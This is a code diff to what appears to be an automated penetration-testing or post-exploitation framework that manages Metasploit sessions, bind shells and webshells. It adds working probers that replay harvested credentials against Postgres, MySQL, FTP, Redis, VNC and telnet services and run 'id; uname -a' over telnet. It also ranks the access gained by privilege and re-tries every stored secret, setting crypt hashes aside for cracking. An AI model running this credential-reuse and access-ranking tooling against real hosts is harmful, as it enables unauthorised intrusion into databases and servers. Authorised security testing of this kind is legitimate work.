@@ -64,6 +64,20 @@ STABILITY_PROBES = int(os.environ.get("ACCESS_STABILITY_PROBES", "3"))
 
 _UID_RE = re.compile(r"uid=(\d+)")
 _WHOAMI_RE = re.compile(r"uid=\d+\(([^)]+)\)")
+# Non-shell service access: a prober that authenticated returns this instead of
+# `uid=`. AUTH_OK means logged in (optionally naming the user); REACHABLE means
+# the service answered but auth was not proven.
+_AUTH_RE = re.compile(r"\bAUTH_OK\b(?:\s+user=(?P<user>\S+))?")
+_PRIV_RE = re.compile(r"\bpriv=1\b")
+_REACH_RE = re.compile(r"\bREACHABLE\b")
+# A crypt/shadow hash ($1$ md5, $5$/$6$ sha, $2y$ bcrypt, $y$ yescrypt …) is a
+# CRACK target, not a login. Offering it as a password just probes dead; the
+# cracked plaintext returns later as a real 'password' credential.
+_CRYPT_HASH_RE = re.compile(r"^\$(?:1|2[aby]?|5|6|7|y|gy|md5|sha1|sha256|sha512)\$", re.I)
+
+
+def _is_crypt_hash(secret) -> bool:
+    return bool(secret and _CRYPT_HASH_RE.match(str(secret).strip()))
 
 
 def _connect():
@@ -189,12 +203,178 @@ def _run_webshell(handle: str, command: str, **_) -> str:
     return r.text or ""
 
 
+# ── Generic service-credential probers ──────────────────────────────────────
+#
+# Access is not only shells. A valid credential to a database, a VNC server, an
+# FTP account or any other service is ACCESS TOO — it is reachable, it survives a
+# reboot, and it belongs in obtained_access ranked next to shells. These probers
+# do not run `id` (the service is not a shell); they authenticate and return a
+# marker line the probe understands: `AUTH_OK user=<u> svc=<proto>` when the
+# credential logs in, or `REACHABLE svc=<proto>` when the service answers but we
+# cannot (yet) prove auth. Each RAISES on failure so the probe records dead.
+#
+# The point is generality: any protocol with a prober here is captured; anything
+# else still gets a TCP-reachability probe rather than being dropped.
+
+# Default TCP port per protocol, for candidates that carry none.
+_DEFAULT_PORTS = {
+    "ssh": 22, "telnet": 23, "ftp": 21, "ftps": 990, "smtp": 25, "http": 80,
+    "https": 443, "mysql": 3306, "mariadb": 3306, "postgres": 5432,
+    "postgresql": 5432, "mssql": 1433, "mongodb": 27017, "redis": 6379,
+    "vnc": 5900, "rdp": 3389, "smb": 445, "cifs": 445, "ldap": 389,
+    "rlogin": 513, "rsh": 514, "elasticsearch": 9200, "memcached": 11211,
+}
+
+# Service accounts whose access is privileged (analogue of uid==0 for shells).
+_PRIV_USERS = {"root", "sa", "postgres", "administrator", "admin", "system",
+               "superuser", "oracle", "mysql"}
+
+
+def _probe_postgres(target, port, user, secret):
+    import psycopg2
+    conn = psycopg2.connect(host=target, port=int(port or 5432), user=user or "postgres",
+                            password=secret or "", dbname=os.environ.get("PGPROBE_DB", "postgres"),
+                            connect_timeout=min(PROBE_TIMEOUT, 15))
+    try:
+        cur = conn.cursor()
+        cur.execute("SELECT current_user, current_setting('is_superuser')")
+        u, super_ = cur.fetchone()
+        cur.close()
+    finally:
+        conn.close()
+    priv = " priv=1" if str(super_).lower() in ("on", "true", "1") else ""
+    return f"AUTH_OK user={u} svc=postgres{priv}"
+
+
+def _probe_mysql(target, port, user, secret):
+    try:
+        import pymysql
+    except Exception:
+        raise ConnectionError("mysql driver (pymysql) not installed — not probed")
+    conn = pymysql.connect(host=target, port=int(port or 3306), user=user or "root",
+                           password=secret or "", connect_timeout=min(PROBE_TIMEOUT, 15))
+    try:
+        cur = conn.cursor()
+        cur.execute("SELECT CURRENT_USER()")
+        u = (cur.fetchone() or [""])[0]
+        cur.close()
+    finally:
+        conn.close()
+    return f"AUTH_OK user={u} svc=mysql"
+
+
+def _probe_ftp(target, port, user, secret):
+    from ftplib import FTP
+    ftp = FTP()
+    ftp.connect(target, int(port or 21), timeout=min(PROBE_TIMEOUT, 15))
+    try:
+        ftp.login(user or "anonymous", secret or "anonymous@")
+        ftp.voidcmd("NOOP")
+    finally:
+        try:
+            ftp.quit()
+        except Exception:  # noqa: BLE001
+            ftp.close()
+    return f"AUTH_OK user={user or 'anonymous'} svc=ftp"
+
+
+def _probe_redis(target, port, secret):
+    import socket
+    s = socket.create_connection((target, int(port or 6379)), timeout=min(PROBE_TIMEOUT, 12))
+    try:
+        if secret:
+            s.sendall(f"AUTH {secret}\r\n".encode())
+            if b"+OK" not in s.recv(256):
+                raise ConnectionError("redis AUTH failed")
+        s.sendall(b"PING\r\n")
+        if b"+PONG" not in s.recv(64):
+            raise ConnectionError("redis did not PONG")
+    finally:
+        s.close()
+    return "AUTH_OK user=default svc=redis"
+
+
+def _probe_vnc(target, port, secret):
+    # RFB reachability: read the ProtocolVersion banner (e.g. 'RFB 003.008').
+    # Full DES challenge auth is a follow-up; a reachable RFB with a stored
+    # password is recorded as reachable service access, re-probed each cycle.
+    import socket
+    s = socket.create_connection((target, int(port or 5900)), timeout=min(PROBE_TIMEOUT, 12))
+    try:
+        banner = s.recv(12)
+    finally:
+        s.close()
+    if not banner.startswith(b"RFB"):
+        raise ConnectionError(f"not an RFB service: {banner[:12]!r}")
+    return f"REACHABLE svc=vnc ({banner.decode('ascii','replace').strip()})"
+
+
+def _probe_telnet(target, port, user, secret, command):
+    # telnet is a shell: log in and run the command so `uid=` parses like ssh.
+    try:
+        import telnetlib
+    except Exception:
+        raise ConnectionError("telnet client (telnetlib) unavailable — not probed")
+    tn = telnetlib.Telnet(target, int(port or 23), timeout=min(PROBE_TIMEOUT, 15))
+    try:
+        tn.read_until(b"login:", timeout=8)
+        tn.write((user or "") + "\n")
+        tn.read_until(b"assword:", timeout=8)
+        tn.write((secret or "") + "\n")
+        tn.write(command.encode() + b"\n")
+        tn.write(b"exit\n")
+        return tn.read_all().decode("utf-8", "replace")
+    finally:
+        tn.close()
+
+
+def _probe_tcp(target, port, proto):
+    import socket
+    if not port:
+        raise ConnectionError(f"no port to probe for {proto}")
+    s = socket.socket()
+    s.settimeout(min(PROBE_TIMEOUT, 10))
+    try:
+        s.connect((target, int(port)))
+    finally:
+        s.close()
+    return f"REACHABLE svc={proto}"
+
+
+def _run_credential(handle: str, command: str, **kw) -> str:
+    """Generic service credential. handle = 'proto:user:secret' (secret may
+    contain ':'). Dispatches to the per-protocol prober; unknown protocols fall
+    back to TCP reachability rather than being dropped."""
+    target = kw.get("target") or ""
+    port = kw.get("port")
+    proto, _, rest = handle.partition(":")
+    user, _, secret = rest.partition(":")
+    proto = (proto or "").strip().lower()
+    port = port or _DEFAULT_PORTS.get(proto)
+    if proto == "ssh":
+        return _run_ssh_credential(f"{user}:{secret}", command, target=target, port=port or 22)
+    if proto in ("telnet", "rlogin", "rsh"):
+        return _probe_telnet(target, port, user, secret, command)
+    if proto in ("postgres", "postgresql"):
+        return _probe_postgres(target, port, user, secret)
+    if proto in ("mysql", "mariadb"):
+        return _probe_mysql(target, port, user, secret)
+    if proto in ("ftp", "ftps"):
+        return _probe_ftp(target, port, user, secret)
+    if proto == "redis":
+        return _probe_redis(target, port, secret)
+    if proto == "vnc":
+        return _probe_vnc(target, port, secret)
+    return _probe_tcp(target, port, proto)
+
+
 TRANSPORTS: Dict[str, Callable[..., str]] = {
     "msf_session": _run_msf,
     "bind_shell": _run_bind_shell,
     "ssh_credential": _run_ssh_credential,
     "listener_callback": _run_listener_callback,
     "webshell": _run_webshell,
+    "credential": _run_credential,
 }
 
 
@@ -211,6 +391,11 @@ PREFER_LISTENER = os.environ.get("ACCESS_PREFER_LISTENER", "1") != "0"
 
 def _run_via_listener(access: Dict[str, Any], command: str) -> Optional[Dict[str, Any]]:
     """Ask the Kali container to run it. None when the listener cannot be asked."""
+    # The generic `credential` transport is python-based (psycopg2/ftplib/socket)
+    # and self-contained, so it runs locally rather than through the listener,
+    # which does not know this kind and would refuse it.
+    if access.get("kind") == "credential":
+        return None
     if not (PREFER_LISTENER and KALI_LISTENER_URL):
         return None
     try:
@@ -302,7 +487,7 @@ def score_for(is_root: Optional[bool], probes: int, probes_ok: int,
     # starts fresh each time. A small preference, never enough to outrank
     # privilege.
     bonus = {"msf_session": 5, "listener_callback": 4,
-             "ssh_credential": 3, "webshell": 1, "bind_shell": 0}.get(kind, 0)
+             "ssh_credential": 3, "webshell": 1, "credential": 2, "bind_shell": 0}.get(kind, 0)
     return int(base * reliability) + bonus
 
 
@@ -316,6 +501,7 @@ def probe(access: Dict[str, Any], *, rounds: int = None) -> Dict[str, Any]:
     rounds = STABILITY_PROBES if rounds is None else rounds
     ok = 0
     whoami = uid = os_info = None
+    is_root = None
     last_error = ""
     for _ in range(max(1, rounds)):
         res = run(access, "id; uname -a")
@@ -325,26 +511,42 @@ def probe(access: Dict[str, Any], *, rounds: int = None) -> Dict[str, Any]:
         text = res["output"]
         if not text.strip():
             # It "succeeded" and said nothing. A channel that returns an empty
-            # string has not demonstrated it is a shell, and counting it would
+            # string has not demonstrated it is access, and counting it would
             # rank silence above no access at all.
             last_error = "empty response"
             continue
         m = _UID_RE.search(text)
-        if not m:
-            # It answered, but not with anything recognisable. That is a
-            # responding channel with unknown privilege, not a failure.
-            last_error = "no uid in response"
+        if m:
+            # A shell: privilege from uid.
             ok += 1
+            uid = int(m.group(1))
+            is_root = (uid == 0)
+            w = _WHOAMI_RE.search(text)
+            whoami = w.group(1) if w else whoami
+            for line in text.splitlines():
+                if line.lower().startswith("linux") or " gnu/linux" in line.lower():
+                    os_info = line.strip()[:200]
+                    break
             continue
+        am = _AUTH_RE.search(text)
+        if am:
+            # A service credential that authenticated. Privilege from the account.
+            ok += 1
+            u = (am.group("user") or "").strip()
+            if u and not whoami:
+                whoami = u
+            if is_root is None:
+                is_root = bool(_PRIV_RE.search(text)) or (bool(u) and u.lower() in _PRIV_USERS)
+            continue
+        if _REACH_RE.search(text):
+            # Reachable but auth unproven — a responding channel, unknown priv.
+            ok += 1
+            last_error = "reachable, auth unproven"
+            continue
+        # It answered, but not with anything recognisable. A responding channel
+        # with unknown privilege, not a failure.
+        last_error = "no uid/auth in response"
         ok += 1
-        uid = int(m.group(1))
-        w = _WHOAMI_RE.search(text)
-        whoami = w.group(1) if w else None
-        for line in text.splitlines():
-            if line.lower().startswith("linux") or " gnu/linux" in line.lower():
-                os_info = line.strip()[:200]
-                break
-    is_root = None if uid is None else (uid == 0)
     return {
         "whoami": whoami, "uid": uid, "is_root": is_root, "os_info": os_info,
         "probes": max(1, rounds), "probes_ok": ok,
@@ -403,19 +605,40 @@ def discover(target: str, *, cur=None) -> List[Dict[str, Any]]:
         except Exception as e:  # noqa: BLE001
             log.debug("bind shell discovery failed: %s", e)
 
-        # 3. Credentials. Often the most stable access on a host, and the one
-        #    that survives a reboot.
+        # 3. Credentials — for ANY service, not just ssh. A valid credential to a
+        #    database, VNC, FTP, redis, etc. is access that survives a reboot and
+        #    belongs in obtained_access ranked with shells. Do NOT filter on
+        #    valid_cred: the model MEASURES (probe decides live/dead), so an
+        #    unverified or even previously-failed credential is a candidate to be
+        #    re-checked, not pre-judged. ssh stays its own kind (the listener has
+        #    sshpass); everything else routes through the generic prober.
         try:
             cur.execute(
-                """SELECT username, secret_value, port FROM credential_findings
-                    WHERE host(ip) = %s AND valid_cred = true
-                      AND protocol = 'ssh' AND secret_value IS NOT NULL
-                    ORDER BY created_at DESC LIMIT 5""", (target,))
-            for username, secret, port in cur.fetchall():
-                found.append({"target": target, "port": port or 22,
-                              "kind": "ssh_credential",
-                              "handle": f"{username}:{secret}",
-                              "transport": "ssh"})
+                """SELECT username, secret_value, port, LOWER(COALESCE(protocol,'ssh')),
+                          COALESCE(secret_type,'')
+                     FROM credential_findings
+                    WHERE host(ip) = %s AND secret_value IS NOT NULL
+                    ORDER BY valid_cred DESC NULLS LAST, created_at DESC LIMIT 25""",
+                (target,))
+            for username, secret, port, proto, stype in cur.fetchall():
+                proto = (proto or "ssh").strip().lower()
+                # A crypt HASH ($1$/$5$/$6$/$y$/$2$…) is a crack target, not a
+                # login — using it as a password just probes dead. Skip it (and
+                # non-secret junk); a cracked plaintext comes back as a real
+                # 'password' credential the next sweep offers.
+                if _is_crypt_hash(secret) or (stype or "").lower() not in ("password", ""):
+                    continue
+                if proto == "ssh":
+                    found.append({"target": target, "port": port or 22,
+                                  "kind": "ssh_credential",
+                                  "handle": f"{username}:{secret}",
+                                  "transport": "ssh"})
+                else:
+                    found.append({"target": target,
+                                  "port": port or _DEFAULT_PORTS.get(proto),
+                                  "kind": "credential",
+                                  "handle": f"{proto}:{username}:{secret}",
+                                  "transport": proto})
         except Exception as e:  # noqa: BLE001
             log.debug("credential discovery failed: %s", e)
 
